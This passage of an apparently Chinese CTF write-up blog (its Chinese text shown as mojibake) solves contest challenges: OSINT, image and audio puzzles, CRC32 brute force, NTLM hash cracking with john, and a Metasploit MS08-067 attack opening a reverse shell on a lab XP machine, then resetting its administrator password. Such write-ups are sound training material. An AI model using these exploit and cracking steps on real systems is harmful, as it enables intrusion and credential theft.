¼å¼ï¼šSYC{èˆªç­å·_åŸå¸‚æ‹¼éŸ³}ï¼ŒåŸå¸‚æ‹¼éŸ³é¦–å­—æ¯å¤§å†™å™¢</p></blockquote><p>æŸ¥è¯¢ <code>æœ‰ç™½è‰²é’¢ç´çš„æœºåœº</code>ï¼Œé…åˆç™¾åº¦ä»¥å›¾æœå›¾åŠŸèƒ½ï¼ŒæŸ¥æ‰¾åˆ°åœ°ç‚¹ä¸ºï¼š<code>æ·±åœ³å®å®‰å›½é™…æœºåœº</code>ã€‚</p><p>ä»1.jpgæå–å‡ºzipå‹ç¼©åŒ…ï¼Œå¾—åˆ°secret.pngï¼Œä¸ºStandard Galactic Alphabetå­—ä½“ï¼Œåˆ©ç”¨<a target="_blank" rel="noopener" href="https://www.dcode.fr/standard-galactic-alphabet">åœ¨çº¿ç½‘ç«™</a>è§£å‡ºä¿¡æ¯ä¸ºï¼š<code>I WANT TO GO TO LIQUOR CITY</code>ã€‚</p><p>LIQUOR CITY=é…’åŸ=æ³¸å·å¸‚ï¼ŒåŸå¸‚æ‹¼éŸ³ï¼š<code>Luzhou</code>ã€‚</p><p>æ ¹æ®å›¾ç‰‡ä¿¡æ¯ï¼šæ—¶é—´8.25 20:19 é©¬ä¸Šèµ·é£ï¼Œåœ¨<a target="_blank" rel="noopener" href="https://www.flightstats.com/v2/flight-tracker/route/SZX/LZO/?year=2023&amp;month=10&amp;date=24&amp;hour=18">flightstats</a>ä¸ŠæŸ¥è¯¢æ·±åœ³-æ³¸å·çš„èˆªç­å·ä¸ºï¼š<code>CZ8579</code>ã€‚</p><p>flagï¼š<code>SYC&#123;CZ8579_Luzhou&#125;</code></p><p>â€‹</p><h3 id="Qingwanå¿ƒéƒ½è¦ç¢äº†"><a href="#Qingwanå¿ƒéƒ½è¦ç¢äº†" class="headerlink" title="Qingwanå¿ƒéƒ½è¦ç¢äº†"></a>Qingwanå¿ƒéƒ½è¦ç¢äº†</h3><blockquote><p>Qingwanå’ŒYxxä¸€èµ·å»æ—…æ¸¸ï¼Œä½†æ˜¯Qingwanç¡çš„å¤ªæ­»å•¦ï¼ŒYxxä¸¢ä¸‹å¥¹ä¸€ä¸ªäººå»ç©äº†ï¼Œå¥¹ä¸€è§‰èµ·æ¥åªçœ‹è§Yxxå‘çš„æœ‹å‹åœˆï¼Œèƒ½å¸®Qingwanæ‰¾åˆ°å¥¹å—ï¼Ÿ flagæ ¼å¼ï¼šSYC{åœ°ç‚¹åå­—}</p></blockquote><p>ç™¾åº¦ï¼Œä»¥å›¾æœå›¾ã€‚</p><p><code>SYC&#123;é‡åº†ä¸­å›½ä¸‰å³¡åšç‰©é¦†&#125;</code></p><p>â€‹</p><h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><blockquote><p>Qrcode can deliver binary msg</p></blockquote><p>pngåˆ†ç¦»å¾—åˆ°ä¸¤å¼ pngå›¾ç‰‡ï¼ŒæŒ‰åƒç´ å€¼å¼‚æˆ–æ“ä½œå³å¾—åˆ°æ–°äºŒç»´ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000000.png&#x27;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000001.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img1.size)</span><br><span class="line"><span class="built_in">print</span>(img2.size)</span><br><span class="line">width , height = img2.size</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width , height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        x1 = <span class="number">1</span> <span class="keyword">if</span> img1.getpixel((<span class="number">3</span>*i,<span class="number">3</span>*j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x2 = <span class="number">1</span> <span class="keyword">if</span> img2.getpixel((i,j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x = x1^x2</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;new.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;hOp3_u_h@ve_Fun&#125;</code></p><p>â€‹</p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><blockquote><p>â€œä½ çœ‹è§äº†ã€ŠDEATH NOTEã€‹ä¸Šé¢çš„åå­—ï¼Œè¿™æ—¶ï¼ŒArahat0ç»™ä½ ä¼ äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ç•™è¨€:â€ â€œ[ä»–æ‹¥æœ‰æ­»ç¥ä¹‹çœ¼ï¼Œè¯·å°å¿ƒï¼Œä»–åœ¨æ‰¾ä½ ï¼Œè¿˜å‰©1920ç§’â€¦]â€ â€œ&lt;å½“å‰æ—¶é—´ 10:52&gt;â€ã€‚flagæœ‰ä¸¤æ®µ</p></blockquote><p>webpæ–‡ä»¶åœ¨çº¿è½¬gifï¼Œä½¿ç”¨gifsplitteræ‹†åˆ†ä¸º880å¼ å›¾ç‰‡ã€‚</p><p>çŒœæµ‹å®½é«˜ä¸º40<em>22ï¼Œåˆå¹¶ï¼š`montage </em>.bmp -tile 40x22 -geometry +0+0 ../out.png`</p><p>æ‹¼å›¾ï¼š<code>gaps --image=out.png --size=48 --save</code></p><p>å¾—åˆ°æ–‡å­—ï¼š<code>XzE0X0tpMTE0Un0==</code>ï¼Œbase64è§£ç å¾—flagååŠæ®µï¼š<code>_14_Ki114R&#125;</code>ã€‚</p><p>mp3æ–‡ä»¶æå–SSTVä¿¡æ¯ï¼š<code>sstv -d L1.wav -o 1.png</code></p><p>å¾—åˆ°çš„å›¾ç‰‡é‡Œçš„æ–‡å­—ä¸ºflagå‰åŠæ®µï¼š<code>SYC&#123;H4xr0t0r</code>ã€‚</p><p>flagï¼š<code>SYC&#123;H4xr0t0r_14_Ki114R&#125;</code></p><p>â€‹</p><h3 id="çªƒå¬é£äº‘"><a href="#çªƒå¬é£äº‘" class="headerlink" title="çªƒå¬é£äº‘"></a>çªƒå¬é£äº‘</h3><blockquote><p>Hackeræ•è·åˆ°äº†ä¸€æ®µæ•Œå¯¹å…¬å¸çš„å¯¹è¯ä¿¡æ¯æµé‡ï¼Œä½ èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password}</p></blockquote><p>NTLMSSPæµé‡ï¼Œåˆ©ç”¨æå–å·¥å…· <a target="_blank" rel="noopener" href="https://github.com/sinnaj-r/NTLMssp-Extract/blob/master/ntlmssp_extract.py">ntlmssp_extract</a> æå–NTLMå¾—ï¼š</p><p><code>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></p><p>ä¿å­˜ä¸ºhashæ–‡ä»¶ï¼Œå†ç”¨johnè§£ï¼š</p><p><code>john hash --wordlist=rockyou.txt</code></p><p>ç»“æœï¼š<code>iamjackspassword (jack)</code></p><p>flagï¼š<code>SYC&#123;iamjackspassword&#125;</code></p><p>â€‹</p><h3 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h3><blockquote><p>Try to extract me!</p></blockquote><p>4å­—èŠ‚CRC32çˆ†ç ´ï¼Œåˆ©ç”¨<a target="_blank" rel="noopener" href="https://github.com/theonlypwner/crc32">CRC32 Tools</a>åˆ†åˆ«çˆ†ç ´8æ®µå­—ç¬¦ä¸²ï¼š</p><p><code>python crc32.py reverse 0xXXXXXXXX</code></p><p>æ‹¼æ¥å¾—flagï¼š<code>SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></p><p>â€‹</p><h3 id="æ—¶ä»£çš„çœ¼æ³ª"><a href="#æ—¶ä»£çš„çœ¼æ³ª" class="headerlink" title="æ—¶ä»£çš„çœ¼æ³ª"></a>æ—¶ä»£çš„çœ¼æ³ª</h3><blockquote><p>2001å¹´çš„å¤§å±è‚¡ç”µè„‘ï¼Œåˆ°äº†2023å¹´ä¼šè¢«æå¾—å¤šæƒ¨å‘¢ï¼Ÿ é“¾æ¥: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek">https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek</a> æå–ç : geek</p></blockquote><p>WinXPè™šæ‹Ÿæœºï¼Œç”¨VMWareåŠ è½½ä½†æ— ç™»å½•å¯†ç ã€‚</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/fengzilin1973/article/details/115967231">ä½¿ç”¨MSF åˆ©ç”¨ ms08_067 å¯¹ XP è¿›è¡Œæ¸—é€</a></p><p>å…ˆå¯¹ç½‘æ®µæ‰«æIPï¼š<code>nmap -sC -sV 192.168.79.0/24</code></p><p>å¾—åˆ°IPåï¼Œä½¿ç”¨MSFæ”»å‡»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms08_067</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloads</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132</span><br><span class="line">RHOST =&gt; 192.168.79.132</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 </span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128</span><br><span class="line">LHOST =&gt; 192.168.79.128</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; run</span><br></pre></td></tr></table></figure><p>getshellä¹‹åï¼Œä½¿ç”¨netå‘½ä»¤ä¿®æ”¹administratorå¯†ç ï¼š</p><p><code>net user administrator 123456</code></p><p>è¿›å…¥ç³»ç»Ÿï¼Œæ¡Œé¢èƒŒæ™¯å›¾å¾—flagï¼š<code>SYC&#123;You_defeated_me_after_22_years&#125;</code>ã€‚</p><p>â€‹</p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><blockquote><p>Just so so å±äºblockchain é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://47.109.106.62:1234/">http://47.109.106.62:1234/</a></p></blockquote><p>ç”¨Remixç¼–è¯‘åï¼Œæ‰§è¡Œ <code>airdrop()</code> å‡½æ•°ï¼Œå³æ»¡è¶³ <code>isSolved()</code> æ¡ä»¶ï¼Œ</p><p>å¾—åˆ°flagï¼š<code>SYC&#123;kajd_u_iaak___hdskj_a&#125;</code>ã€‚</p><p>â€‹</p><h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><blockquote><p>Great å±äºblockchain é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://47.109.106.62:1235/">http://47.109.106.62:1235/</a></p></blockquote><p>è½¬è´¦å³å¯ã€‚</p><p>â€‹</p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH_N2TE"></a>DEATH_N2TE</h3><blockquote><p>â€œä½ çŸ¥é“äº†çœŸç›¸ï¼Œæ­£å¸¦ä¸Šã€ŠDEATH NOTEã€‹å‡†å¤‡é€ƒç¦»ï¼Œæ°å¥½ï¼ŒMuscialå‘ç»™ä½ ä¸€ä¸ªè§†é¢‘ï¼Œå¹¶è¯´:â€ â€œ[è¿™é‡Œè®°ä¸‹äº†ä»–çš„çœŸåä»¥åŠç…§ç‰‡ï¼Œè¯·å†™åœ¨é‚£æœ¬ç¬”è®°ä¸Šé¢ï¼Œæˆ‘å’ŒArahat0éƒ½è¢«ä»–çœ‹è§äº†çœŸåâ€¦]â€ã€‚</p></blockquote><p>mp4åˆ†å¸§ï¼š<code>ffmpeg -i kira.mp4 %05d.png</code></p><p>æå–æ¯ä¸€å¸§çš„åˆ—ï¼Œç»„åˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">width,height = <span class="number">192</span>,<span class="number">108</span></span><br><span class="line">img_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&#x27;x/<span class="subst">&#123;<span class="built_in">str</span>(i+<span class="number">1</span>).zfill(<span class="number">5</span>)&#125;</span>.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            tmp = img.getpixel((i*<span class="number">10</span>+start,j*<span class="number">10</span>+start))</span><br><span class="line">            img_new.putpixel((i,j),tmp)</span><br><span class="line"></span><br><span class="line">    img_new.save(<span class="string">f&#x27;x/out_with_start_<span class="subst">&#123;start&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>start=5çš„æ—¶å€™ï¼Œå¾—flagï¼š<code>SYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;</code>ã€‚</p><p>â€‹</p><h3 id="çªƒå¬é£äº‘-V2"><a href="#çªƒå¬é£äº‘-V2" class="headerlink" title="çªƒå¬é£äº‘-V2"></a>çªƒå¬é£äº‘-V2</h3><blockquote><p>è¿™æ¬¡Hackeræ•è·åˆ°äº†Jackç™»å½•é‚®ä»¶ç³»ç»Ÿçš„æµé‡ï¼Œä½ è¿˜èƒ½ä»æµé‡ä¸­åˆ†æå‡ºJackçš„å¯†ç å—ï¼Œflagä¸ºSYC{password}</p></blockquote><p>SMTPæµé‡ï¼Œwireshark è§£æntlmsspï¼ŒæŒ‰ç…§</p><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=mu7-naA0muc">Extracting NTLM Hash Values from a Wireshark packet capture</a></p><p>æ„é€ å‡ºntlmsspï¼š</p><p><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></p><p>å†ç”¨johnçˆ†ç ´å³å¯ï¼š<code>john token.txt --wordlist=rockyou.txt</code></p><p>å¾—åˆ° <code>jack100589barney (jack)</code>ï¼Œflagï¼š<code>SYC&#123;jack100589barney&#125;</code>ã€‚</p><p>â€‹</p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2024/03/11/match-HSCCTF-2024/" title="HSCCTF 2024"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2023/09/10/match-SICTF2023-Round2/" title="SICTF2023 Round2"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2024 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script></body></html>